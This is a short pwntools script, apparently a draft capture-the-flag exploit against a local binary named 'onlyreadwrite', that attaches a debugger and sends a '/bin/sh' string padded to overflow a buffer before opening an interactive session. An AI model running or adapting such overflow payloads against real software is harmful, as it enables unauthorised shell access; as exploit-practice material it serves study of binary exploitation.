from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']
r = process("./onlyreadwrite")
gdb.attach(r, """b get_name
""")

shellcode = b"/bin/sh\x00"
shellcode = shellcode.ljust(1016, b"\x00")
payload = b"B"*8
r.send(shellcode + payload)

r.interactive()